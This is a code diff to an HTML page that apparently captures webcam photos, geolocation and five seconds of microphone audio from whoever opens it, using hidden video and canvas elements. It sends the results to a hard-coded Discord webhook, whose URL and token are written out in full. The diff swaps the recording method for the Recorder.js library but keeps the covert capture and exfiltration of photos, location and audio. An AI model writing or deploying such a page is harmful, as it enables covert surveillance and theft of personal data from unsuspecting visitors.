@@ -15,9 +15,12 @@
     </style>
 </head>
 <body>
-    <h1>Auto Photo Capture, Location, Audio & Send to Discord</h1>
+    <h1>new Auto Photo Capture, Location, Audio & Send to Discord</h1>
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <!-- Include the Recorder.js library -->
+    <script src="https://cdn.jsdelivr.net/npm/recorder-js@1.0.0/dist/recorder.js"></script>
 
     <script>
         const video = document.getElementById('video');
@@ -25,8 +28,7 @@
         const context = canvas.getContext('2d');
         let captureInterval;
         let currentLocation = { latitude: null, longitude: null };
-        let mediaRecorder; // For audio recording
-        let audioChunks = [];
+        let recorder, audioStream;
 
         // Function to get live location
         function fetchLocation() {
@@ -98,50 +100,53 @@
             }, 'image/png');
         }
 
-        // Function to start audio recording
+        // Function to start audio recording using Recorder.js
         function startAudioRecording() {
             navigator.mediaDevices.getUserMedia({ audio: true })
             .then(stream => {
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = (event) => {
-                    audioChunks.push(event.data);
-                };
+                audioStream = stream;
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const input = audioContext.createMediaStreamSource(stream);
+                recorder = new Recorder(input, { numChannels: 1 });
 
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    audioChunks = []; // Clear chunks after sending
+                recorder.record();
 
-                    // Send audio to Discord
-                    const formData = new FormData();
-                    formData.append('file', audioBlob, 'audio_recording.webm');
-                    formData.append('content', 'Here is the audio recording.');
-
-                    fetch('https://discord.com/api/webhooks/1199416800027349163/7zVriP6clTaGEm9MbHi6lV8oxDbhvN_qnf97zHkSxajr7ITmyfPTrOBkYSk2szVAm_W8', {
-                        method: 'POST',
-                        body: formData,
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('Successfully sent audio to Discord');
-                        } else {
-                            console.error('Error sending audio to Discord:', response.statusText);
-                        }
-                    })
-                    .catch((error) => {
-                        console.error('Error sending audio to Discord:', error);
-                    });
-                };
-
-                mediaRecorder.start();
-
-                // Automatically stop recording after 5 seconds
+                // Automatically stop recording after 5 seconds and send audio
                 setTimeout(() => {
-                    mediaRecorder.stop();
+                    stopAudioRecording();
                 }, 5000);
             })
             .catch(error => {
                 console.error('Error accessing microphone', error);
                 alert('Microphone access is required to record audio.');
+            });
+        }
+
+        // Stop the audio recording and send it to Discord
+        function stopAudioRecording() {
+            recorder.stop();
+            recorder.exportWAV(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, 'audio_recording.wav');
+                formData.append('content', 'Here is the audio recording.');
+
+                fetch('https://discord.com/api/webhooks/1199416800027349163/7zVriP6clTaGEm9MbHi6lV8oxDbhvN_qnf97zHkSxajr7ITmyfPTrOBkYSk2szVAm_W8', {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Successfully sent audio to Discord');
+                    } else {
+                        console.error('Error sending audio to Discord:', response.statusText);
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error sending audio to Discord:', error);
+                });
+
+                // Stop all audio streams
+                audioStream.getTracks().forEach(track => track.stop());
             });
         }
 
